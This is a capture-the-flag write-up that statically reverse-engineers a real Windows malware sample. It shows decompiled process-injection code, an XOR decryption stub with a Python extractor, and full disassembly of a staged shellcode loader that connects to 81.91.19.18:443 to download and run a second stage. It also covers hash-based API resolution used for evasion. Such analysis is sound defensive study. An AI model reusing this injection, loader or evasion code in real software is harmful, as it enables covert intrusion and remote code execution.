---
title: "C2mmunication, CTFZone Quals"
date: 2025-08-21T12:00:00+00:00
categories:
  - writeup
tags:
  - writeup
  - reverse engineering
  - windows 
  - C2
  - CTFZone Quals
author: "Luca"
excerpt: "Dissecting a simple C2 for windows"

read_time: true
---



# Introduction

The challenge presented us with a password-protected ZIP file. The password was "infected" - a well-known convention in the cybersecurity community used when sharing actual malware samples to prevent accidental execution.

Upon extracting the archive, I found a single file named `prog.exe_`. The underscore appended to the file extension is a common safety measure that disables automatic execution when double-clicking the file in Windows environments.

These initial observations strongly suggested that we were dealing with real malware rather than a simulated threat. Given the potentially dangerous nature of the sample and the lack of an isolated virtual machine environment, I made the decision to proceed exclusively with static analysis techniques to avoid any risk of system compromise.


# Challenge Analysis

## Initial Reverse Engineering - Main Function Analysis

Loading the executable into IDA, I quickly identified the main function and began analyzing its behavior. The decompiled code revealed several interesting operations:

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
    char *buff_ptr; // r8
    _OWORD *v5; // rax
    __int64 counter; // rcx
    // ... variable declarations ...
    
    char Buffer[560]; // [rsp+40h] [rbp-248h] BYREF
    buff_ptr = Buffer;
    v5 = &bytecode_enc;
    counter = 4i64;
    
    // Copy encrypted bytecode to local buffer in chunks
    do {
        buff_ptr += 128;
        // XMM register operations for efficient memory copying
        // ... chunk copying logic ...
        --counter;
    } while ( counter );
    
    // Process injection sequence
    pid = unknown_libname_26(argv[1]);
    sub_140001010("Injecting to PID: %i", pid);
    v18 = unknown_libname_26(argv[1]);
    process = OpenProcess(0x1FFFFFu, 0, v18);
    mem = VirtualAllocEx(process, 0i64, 0x228ui64, 0x3000u, 0x40u);
    WriteProcessMemory(process, mem, Buffer, 0x228ui64, 0i64);
    CreateRemoteThread(process, 0i64, 0i64, (LPTHREAD_START_ROUTINE)mem, 0i64, 0, 0i64);
    CloseHandle(process);
    return 0;
}
```
(variable and function names were changed by me)

The main function performs several key operations:

1. **Shellcode Preparation**: It copies bytes from a global variable (`bytecode_enc`) into a local buffer, processing the data in chunks using XMM registers for efficient memory operations.

2. **Process Targeting**: It opens a target process using the PID specified as a command-line argument.

3. **Memory Allocation**: It allocates executable memory space within the target process using `VirtualAllocEx` with `PAGE_EXECUTE_READWRITE` permissions.

4. **Code Injection**: It writes the prepared shellcode buffer into the allocated memory space of the target process.

5. **Remote Execution**: It creates a new thread in the target process that executes the injected shellcode.

6. **Cleanup**: It closes the process handle.

This is a classic **process injection** technique commonly used in malware. The purpose of this approach, rather than executing the shellcode directly, is to mask malicious activity. When the injected code runs, any suspicious behavior (high CPU usage, network connections, file system access) will appear to originate from legitimate processes like `notepad.exe` or other benign applications, making detection significantly more difficult for both users and security software.

The next step in the analysis was to extract and examine the shellcode stored in the global variable to understand the actual malicious payload.



## Shellcode Extraction and Decryption

With the main function behavior understood, the next step was to extract and analyze the actual shellcode stored in the global variable. Loading the binary data into IDA Pro revealed an interesting structure.

The shellcode began with valid x86-64 assembly instructions, but quickly transitioned into what appeared to be random bytes. Upon closer examination of the initial instructions, I discovered a runtime decryption routine:

```assembly
seg000:0000000000000000 loc_0:                                  ; DATA XREF: seg000:000000000000000A↓o
seg000:0000000000000000                 xor     rcx, rcx
seg000:0000000000000003                 sub     rcx, 0FFFFFFFFFFFFFFC0h
seg000:000000000000000A                 lea     rax, loc_0
seg000:0000000000000011                 mov     rbx, 0E64DDC02B7BACB6Fh
seg000:000000000000001B
seg000:000000000000001B loc_1B:                                 ; CODE XREF: seg000:0000000000000025↓j
seg000:000000000000001B                 xor     qword ptr ds:rva loc_27[rax], rbx
seg000:000000000000001F                 sub     rax, 0FFFFFFFFFFFFFFF8h
seg000:0000000000000025                 loop    loc_1B
seg000:0000000000000027
seg000:0000000000000027 loc_27:                                 ; DATA XREF: seg000:loc_1B↑w
seg000:0000000000000027                 xchg    eax, ebx
seg000:0000000000000028                 cmp     dword ptr [rcx], 53h ; 'S'
seg000:000000000000002B                 repne xor al, 81h
seg000:000000000000002B ; ---------------------------------------------------------------------------
seg000:000000000000002E                 db 0E6h
seg000:000000000000002F ; ---------------------------------------------------------------------------
seg000:000000000000002F                 outsd
seg000:0000000000000030                 retf
seg000:0000000000000030 ; ---------------------------------------------------------------------------
seg000:0000000000000031                 db 0FBh
seg000:0000000000000032                 dw 43E6h, 1F8Ch, 39B7h
seg000:0000000000000038                 dq 0FB4C69467658B83h, 4FB4C6941AE53183h, 1D6D05964800B583h
seg000:0000000000000050                 dq 0C3267C94CB86F79Bh, 0AEA76DF000CBDBF7h, 3D0BAF1D03F6B702h
[...]
```

The pattern indicated that the shellcode was implementing **runtime decryption** - a common technique used by malware to evade static analysis. The valid instructions at the beginning were responsible for decrypting the remaining encrypted payload using a hardcoded XOR key.

I identified the XOR key: `0E64DDC02B7BACB6Fh`. The decryption process started at offset `0x27` and continued for the remainder of the shellcode.

To extract and decrypt the payload:

```python
from pwn import xor

content = b''
with open("prog.exe_", "rb") as file:
    content = file.read()

# Locate the shellcode start pattern
index = content.find(b'\x48\x31\xc9')  # xor rcx, rcx instruction
key = bytes.fromhex("e64ddc02b7bacb6f")[::-1]  # Reverse byte order for little-endian
payload = content[index: index + 512]

print("payload in hex:")
print(payload.hex())

# Save the raw encrypted payload
with open('payload.bin', 'wb') as file:
    file.write(payload)

# Decrypt the payload starting from offset 0x27
decoded = xor(payload[0x27:], key)

# Save the decrypted shellcode
with open("decoded.bin", "wb") as file:
    file.write(decoded)
```

The script successfully extracted and decrypted the shellcode, providing us with the actual malicious payload for further analysis. The decrypted shellcode could now be loaded into IDA Pro for comprehensive reverse engineering.

### Decrypted Shellcode Analysis

Loading the decrypted payload into IDA Pro revealed a sophisticated piece of shellcode. Let's see the complete disassembly first, then break it down section by section:

```assembly
                cld
                and     rsp, 0FFFFFFFFFFFFFFF0h
                call    sub_D6
; ---------------------------------------------------------------------------
                push    r9
                push    r8
                push    rdx
                push    rcx
                push    rsi
                xor     rdx, rdx
                mov     rdx, gs:[rdx+60h]
                mov     rdx, [rdx+18h]
                mov     rdx, [rdx+20h]

loc_21:
                movzx   rcx, word ptr [rdx+4Ah]
                mov     rsi, [rdx+50h]
                xor     r9, r9

loc_2D:
                xor     rax, rax
                lodsb
                cmp     al, 61h
                jl      short loc_37
                sub     al, 20h

loc_37:
                ror     r9d, 0Dh
                add     r9d, eax
                loop    loc_2D
                push    rdx
                mov     rdx, [rdx+20h]
                push    r9
                mov     eax, [rdx+3Ch]
                add     rax, rdx
                cmp     word ptr [rax+18h], 20Bh
                jnz     loc_CB
                mov     eax, [rax+88h]
                test    rax, rax
                jz      short loc_CB
                add     rax, rdx
                mov     r8d, [rax+20h]
                mov     ecx, [rax+18h]
                add     r8, rdx
                push    rax

loc_72:
                jrcxz   loc_CA
                xor     r9, r9
                dec     rcx
                mov     esi, [r8+rcx*4]
                add     rsi, rdx

loc_81:
                xor     rax, rax
                lodsb
                ror     r9d, 0Dh
                add     r9d, eax
                cmp     al, ah
                jnz     short loc_81
                add     r9, [rsp+8]
                cmp     r9d, r10d
                jnz     short loc_72
                pop     rax
                mov     r8d, [rax+24h]
                add     r8, rdx
                mov     cx, [r8+rcx*2]
                mov     r8d, [rax+1Ch]
                add     r8, rdx
                mov     eax, [r8+rcx*4]
                add     rax, rdx
                pop     r8
                pop     r8
                pop     rsi
                pop     rcx
                pop     rdx
                pop     r8
                pop     r9
                pop     r10
                sub     rsp, 20h
                push    r10
                jmp     rax

; ... (continuing with rest of shellcode)
```

#### Dynamic API Resolution

The initial section of the shellcode implements a **dynamic API resolution** mechanism. After the `call sub_D6` instruction, which places the return address (0xA) into `rbp`, the code beginning at offset 0xA performs the following operations:

```assembly
push    r9
push    r8  
push    rdx
push    rcx
push    rsi
xor     rdx, rdx
mov     rdx, gs:[rdx+60h]    ; Access Process Environment Block (PEB)
mov     rdx, [rdx+18h]       ; Access LoaderData  
mov     rdx, [rdx+20h]       ; Access InMemoryOrderModuleList
```

This code walks through the **Process Environment Block (PEB)** to enumerate loaded DLLs, then implements a custom hashing algorithm to resolve API functions by hash rather than by name. More details on this routine in the appendix.

#### Main Payload Analysis

Now let's analyze the main payload starting from `sub_D6`. This function immediately performs `pop rbp`, storing the return address in `rbp` - this address points to the dynamic API resolution routine just described (more analysis on this routine later).

The function proceeds with several API calls using the hash-based resolution mechanism. On Windows x64, the calling convention uses `rcx`, `rdx`, `r8`, and `r9` as the first four parameters.

**First API Call - LoadLibraryA:**
```assembly
mov     r14, '23_2sw'        ; "ws2_32" string (reversed due to little-endian)
push    r14
mov     r14, rsp             ; R14 now points to "ws2_32" string
mov     rcx, r14             ; First parameter: DLL name
mov     r10d, 726774Ch       ; Hash for LoadLibraryA
call    rbp                  ; Call LoadLibraryA("ws2_32")
```

**Second API Call - WSAStartup:**
```assembly
mov     rdx, r13             ; Second parameter: pointer to WSADATA structure
push    101h
pop     rcx                  ; First parameter: Winsock version
mov     r10d, 6B8029h        ; Hash for WSAStartup
call    rbp                  ; Call WSAStartup(0x101, lpWSAData)
```

**Third API Call - socket:**
```assembly
push    rax                  ; Save previous return values
push    rax
xor     r9, r9               ; Fourth parameter: 0 (protocol, let system choose)
xor     r8, r8               ; Third parameter: 0 (protocol)
inc     rax
mov     rdx, rax             ; Second parameter: 1 (SOCK_STREAM)
inc     rax  
mov     rcx, rax             ; First parameter: 2 (AF_INET)
mov     r10d, 0E0DF0FEAh     ; Hash for socket
call    rbp                  ; Call socket(AF_INET, SOCK_STREAM, 0)
mov     rdi, rax             ; Store socket descriptor
```

**Fourth API Call - connect (with retry loop):**
```assembly
push    10h
pop     r8                   ; Third parameter: sizeof(sockaddr_in) = 16
mov     rdx, r12             ; Second parameter: pointer to sockaddr_in structure
mov     rcx, rdi             ; First parameter: socket descriptor
mov     r10d, 6174A599h      ; Hash for connect
call    rbp                  ; Call connect(socket, sockaddr, 16)
test    eax, eax
jz      short loc_15E        ; If successful (return 0), continue
dec     r14                  ; Decrement retry counter (initially 10)
jnz     short loc_13E        ; If retries left, try again
```

**Fifth API Call - recv (receive stage size):**
```assembly
sub     rsp, 10h             ; Allocate 16 bytes on stack for buffer
mov     rdx, rsp             ; Second parameter: buffer pointer
xor     r9, r9               ; Fourth parameter: 0 (no flags)
push    4
pop     r8                   ; Third parameter: 4 bytes to receive
mov     rcx, rdi             ; First parameter: socket descriptor
mov     r10d, 5FC8D902h      ; Hash for recv
call    rbp                  ; Call recv(socket, buffer, 4, 0)
```

**Sixth API Call - VirtualAlloc:**
```assembly
pop     rsi                  ; Get the 4-byte size value received
push    40h
pop     r9                   ; Fourth parameter: PAGE_EXECUTE_READWRITE
push    1000h
pop     r8                   ; Third parameter: MEM_COMMIT
mov     rdx, rsi             ; Second parameter: size (from recv)
xor     rcx, rcx             ; First parameter: NULL (let system choose address)
mov     r10d, 0E553A458h     ; Hash for VirtualAlloc
call    rbp                  ; Call VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
```

**Seventh API Call - recv (receive shellcode):**
```assembly
xor     r9, r9               ; Fourth parameter: 0 (no flags)
mov     r8, rsi              ; Third parameter: number of bytes to receive
mov     rdx, rbx             ; Second parameter: allocated memory address
mov     rcx, rdi             ; First parameter: socket descriptor
mov     r10d, 5FC8D902h      ; Hash for recv
call    rbp                  ; Call recv(socket, allocated_memory, size, 0)
```

The shellcode implements a **stage-1 loader** that:
1. Establishes a network connection to a remote server
2. Receives the size of the next stage payload
3. Allocates executable memory for the payload
4. Downloads and executes the second-stage payload

This is a classic **staged payload** architecture commonly used in penetration testing tools and malware, where the initial payload is kept minimal to reduce detection, and the main functionality is delivered in subsequent stages.


### Challenge Solution

With the shellcode fully analyzed, the final step was to extract the connection target. Examining the hardcoded `SOCKADDR_IN` structure in the payload:

```assembly
mov     r12, 515B1312BB010002h  ; SOCKADDR_IN structure bytes
```

Breaking down this 64-bit value:
- `0002` = `AF_INET` (address family)
- `01BB` = port 443 in network byte order (big-endian)
- `12135B51` = IP address 81.91.19.18 in network byte order

The shellcode attempts to connect to **81.91.19.18:443**, which represents the command and control server for this staged payload.

**Flag: `81.91.19.18:443`**

---

## Appendix: Hash-Based API Resolution Analysis

One of the most interesting aspects of this shellcode is its  API resolution mechanism. Instead of importing functions directly, it dynamically resolves Windows API functions using a custom hashing algorithm. This technique is commonly employed by malware to evade static analysis.

### The API Resolution Routine

Here's the complete API resolution routine with detailed comments:

```assembly
; Entry point - save registers and initialize
push    r9
push    r8
push    rdx
push    rcx
push    rsi
xor     rdx, rdx
mov     rdx, gs:[rdx+60h]        ; Access Process Environment Block (PEB)
mov     rdx, [rdx+18h]           ; Access PEB_LDR_DATA.LoaderData
mov     rdx, [rdx+20h]           ; Access InMemoryOrderModuleList.Flink

; Main DLL enumeration loop
loc_21:
movzx   rcx, word ptr [rdx+4Ah]  ; Read BaseDllName.MaximumLength from LDR_DATA_TABLE_ENTRY
mov     rsi, [rdx+50h]           ; Read BaseDllName.Buffer pointer
xor     r9, r9                   ; Initialize hash accumulator

; DLL name hashing loop
loc_2D:
xor     rax, rax                 ; Clear RAX
lodsb                            ; Load next character from DLL name, increment RSI
cmp     al, 61h                  ; Compare with 'a' (0x61)
jl      short loc_37             ; If less than 'a', skip uppercase conversion
sub     al, 20h                  ; Convert lowercase to uppercase (subtract 0x20)

loc_37:
ror     r9d, 0Dh                 ; Rotate hash right by 13 bits
add     r9d, eax                 ; Add character to hash
loop    loc_2D                   ; Continue until RCX (string length) reaches 0

; Process DLL's export table
push    rdx                      ; Save current LDR_DATA_TABLE_ENTRY pointer
mov     rdx, [rdx+20h]           ; Access DllBase from LDR_DATA_TABLE_ENTRY
push    r9                       ; Save DLL name hash
mov     eax, [rdx+3Ch]           ; Read IMAGE_DOS_HEADER.e_lfanew
add     rax, rdx                 ; Calculate NT headers address
cmp     word ptr [rax+18h], 20Bh ; Check IMAGE_OPTIONAL_HEADER64.Magic (0x020B)
jnz     loc_CB                   ; Skip if not 64-bit PE
mov     eax, [rax+88h]           ; Read DataDirectory[0].VirtualAddress (export table RVA)
test    rax, rax
jz      short loc_CB             ; Skip if no export table
add     rax, rdx                 ; Calculate export table virtual address
mov     r8d, [rax+20h]           ; Read IMAGE_EXPORT_DIRECTORY.AddressOfNames
mov     ecx, [rax+18h]           ; Read IMAGE_EXPORT_DIRECTORY.NumberOfNames
add     r8, rdx                  ; Calculate AddressOfNames virtual address
push    rax                      ; Save export directory pointer

; Function name enumeration loop
loc_72:
jrcxz   loc_CA                   ; Exit if no more names to check
xor     r9, r9                   ; Reset hash accumulator
dec     rcx                      ; Decrement name counter (use as index)
mov     esi, [r8+rcx*4]          ; Read function name RVA from AddressOfNames array
add     rsi, rdx                 ; Calculate function name virtual address

; Function name hashing loop
loc_81:
xor     rax, rax                 ; Clear RAX
lodsb                            ; Load next character from function name
ror     r9d, 0Dh                 ; Rotate hash right by 13 bits
add     r9d, eax                 ; Add character to hash
cmp     al, ah                   ; Check if character is NULL (AH is 0)
jnz     short loc_81             ; Continue if not end of string

; Hash comparison and function resolution
add     r9, [rsp+8]              ; Add DLL name hash to function name hash
cmp     r9d, r10d                ; Compare with target hash (passed in R10)
jnz     short loc_72             ; Continue searching if no match

; Function found - resolve address
pop     rax                      ; Restore export directory pointer
mov     r8d, [rax+24h]           ; Read IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals
add     r8, rdx                  ; Calculate AddressOfNameOrdinals virtual address
mov     cx, [r8+rcx*2]           ; Read ordinal from AddressOfNameOrdinals array
mov     r8d, [rax+1Ch]           ; Read IMAGE_EXPORT_DIRECTORY.AddressOfFunctions
add     r8, rdx                  ; Calculate AddressOfFunctions virtual address
mov     eax, [r8+rcx*4]          ; Read function RVA using ordinal as index
add     rax, rdx                 ; Calculate final function address

; Cleanup and return
pop     r8                       ; Restore registers
pop     r8
pop     rsi
pop     rcx
pop     rdx
pop     r8
pop     r9
pop     r10                      ; Pop return address
sub     rsp, 20h                 ; Allocate shadow space for function call
push    r10                      ; Restore return address
jmp     rax                      ; Jump to resolved function

; Continue to next DLL if function not found
loc_CA:
pop     rax                      ; Clean up export directory pointer
loc_CB:
pop     r9                       ; Restore DLL name hash
pop     rdx                      ; Restore LDR_DATA_TABLE_ENTRY pointer
mov     rdx, [rdx]               ; Move to next entry (InMemoryOrderLinks.Flink)
jmp     loc_21                   ; Continue with next DLL
```

### How the Algorithm Works

The API resolution routine implements a sophisticated hash-based function lookup that operates in several phases:

**Phase 1: DLL Enumeration**
The routine begins by accessing the **Process Environment Block (PEB)** through the `gs:[0x60]` segment register. The PEB contains the `PEB_LDR_DATA` structure, which maintains linked lists of all loaded modules in the process. The shellcode walks the `InMemoryOrderModuleList` to enumerate each loaded DLL.

**Phase 2: DLL Name Hashing**
For each DLL, the routine extracts the `BaseDllName` from the `LDR_DATA_TABLE_ENTRY` structure. It then applies a custom hashing algorithm:
- Each character is converted to uppercase if it's lowercase
- The hash is rotated right by 13 bits
- The character value is added to the hash

This produces a unique 32-bit hash for each DLL name (e.g., "KERNEL32.DLL", "NTDLL.DLL").

**Phase 3: Export Table Processing**
For each DLL, the routine locates the PE export table by:
- Reading the `e_lfanew` field from the DOS header to find the NT headers
- Verifying the PE magic number (0x020B for 64-bit)
- Extracting the export directory from the data directories array

**Phase 4: Function Name Hashing**
The routine iterates through all exported function names using the `AddressOfNames` array. For each function name, it applies the same hashing algorithm used for DLL names.

**Phase 5: Combined Hash Matching**
The final hash is calculated by adding the DLL name hash to the function name hash. This combined hash is compared against the target hash passed in the `r10` register.

**Phase 6: Function Address Resolution**
When a match is found, the routine uses the function's index to:
- Look up the ordinal in the `AddressOfNameOrdinals` array
- Use the ordinal to index into the `AddressOfFunctions` array
- Calculate the final virtual address of the function

### Pseudocode Implementation

Here's a C-style pseudocode representation of the algorithm:

```c
PVOID resolve_api_by_hash(DWORD target_hash) {
    // Access PEB and get first loaded module
    PPEB peb = (PPEB)__readgsqword(0x60);
    PLDR_DATA_TABLE_ENTRY module = (PLDR_DATA_TABLE_ENTRY)
        peb->LoaderData->InMemoryOrderModuleList.Flink;
    
    // Iterate through all loaded modules
    while (module) {
        // Calculate DLL name hash
        DWORD dll_hash = 0;
        PWCHAR dll_name = module->BaseDllName.Buffer;
        USHORT name_len = module->BaseDllName.MaximumLength / 2;
        
        for (USHORT i = 0; i < name_len; i++) {
            WCHAR c = dll_name[i];
            if (c >= 'a' && c <= 'z') c -= 0x20;  // Convert to uppercase
            dll_hash = _rotr(dll_hash, 13) + c;
        }
        
        // Access export table
        PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)module->DllBase;
        PIMAGE_NT_HEADERS64 nt_headers = (PIMAGE_NT_HEADERS64)
            ((PBYTE)module->DllBase + dos_header->e_lfanew);
        
        if (nt_headers->OptionalHeader.Magic != 0x020B) continue;
        
        PIMAGE_EXPORT_DIRECTORY export_dir = (PIMAGE_EXPORT_DIRECTORY)
            ((PBYTE)module->DllBase + 
             nt_headers->OptionalHeader.DataDirectory[0].VirtualAddress);
        
        if (!export_dir) continue;
        
        // Iterate through exported functions
        PDWORD name_rvas = (PDWORD)((PBYTE)module->DllBase + export_dir->AddressOfNames);
        PWORD ordinals = (PWORD)((PBYTE)module->DllBase + export_dir->AddressOfNameOrdinals);
        PDWORD func_rvas = (PDWORD)((PBYTE)module->DllBase + export_dir->AddressOfFunctions);
        
        for (DWORD i = 0; i < export_dir->NumberOfNames; i++) {
            // Calculate function name hash
            DWORD func_hash = 0;
            PCHAR func_name = (PCHAR)((PBYTE)module->DllBase + name_rvas[i]);
            
            while (*func_name) {
                func_hash = _rotr(func_hash, 13) + *func_name++;
            }
            
            // Check combined hash
            if ((dll_hash + func_hash) == target_hash) {
                WORD ordinal = ordinals[i];
                return (PVOID)((PBYTE)module->DllBase + func_rvas[ordinal]);
            }
        }
        
        // Move to next module
        module = (PLDR_DATA_TABLE_ENTRY)module->InMemoryOrderLinks.Flink;
    }
    
    return NULL;  // Function not found
}
```

This hash-based API resolution technique is particularly effective for malware because:
- It avoids static import tables that signature-based detection might flag
- The hash values provide no obvious indication of which functions are being resolved
- It can resolve functions from any loaded DLL, not just those in the import table
- The custom hashing algorithm makes it difficult for analysts to pre-compute hash dictionaries

## Conclusion

This challenge stood out as a rewarding reverse engineering exercise. While I managed to extract the flag (the C2 server address `81.91.19.18:443`) within an hour during the live competition, the true value of this challenge extended far beyond the initial solve.

What made this challenge particularly compelling was its use of actual malicious code. This provided an authentic experience of analyzing real-world malware techniques. 

The challenge kept me engaged for several days after the competition ended, diving deep into every aspect of the shellcode's functionality, and writing this blog post. This extended analysis helped me approach Windows internals and expand my knowledge. 



### Useful Resources

During the analysis, I found several resources particularly valuable for understanding the underlying Windows structures and concepts:

- **Process Environment Block (PEB) Analysis**: Metehan Bulut's blog post "[Understanding the Process Environment Block (PEB) for Malware Analysis](https://metehan-bulut.medium.com/understanding-the-process-environment-block-peb-for-malware-analysis-26315453793f#e4f2)" provided an excellent introduction into PEB structure and its role in malware analysis.

- **Windows Kernel Structures**: The [Vergilius Project](https://www.vergiliusproject.com/) for accessing detailed definitions of undocumented Windows kernel structures across different OS versions, particularly for understanding the precise layout of `LDR_DATA_TABLE_ENTRY` and related structures.

